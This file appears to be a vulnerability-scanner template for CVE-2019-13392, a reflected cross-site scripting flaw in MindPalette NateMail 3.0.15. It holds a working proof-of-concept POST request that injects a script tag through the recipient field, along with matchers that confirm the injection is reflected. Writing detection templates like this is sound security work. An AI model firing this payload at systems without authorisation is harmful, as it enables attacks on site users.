id: CVE-2019-13392

info:
  name: MindPalette NateMail 3.0.15 - (XSS)
  author: pikpikcu
  severity: medium
  description: reflected Cross-Site Scripting (XSS) vulnerability in MindPalette NateMail 3.0.15 allows an attacker to execute remote JavaScript in a victim's browser via a specially crafted POST request. The application will reflect the recipient value if it is not in the NateMail recipient array. Note that this array is keyed via integers by default, so any string input will be invalid.
  reference:
    - https://www.doyler.net/security-not-included/natemail-vulnerabilities
    - https://nvd.nist.gov/vuln/detail/CVE-2019-13392
  tags: cves,cve2019,natemail,xss

requests:
  - raw:
      - |
        POST /NateMail.php HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Content-Type: application/x-www-form-urlencoded

        recipient=%3cscript%3ealert(document.domain)%3c%2fscript%3e

    matchers-condition: and
    matchers:

      - type: word
        words:
          - '<script>alert(document.domain)</script>'
        part: body

      - type: word
        words:
          - 'Content-Type: text/html'
        part: header

      - type: status
        status:
          - 200
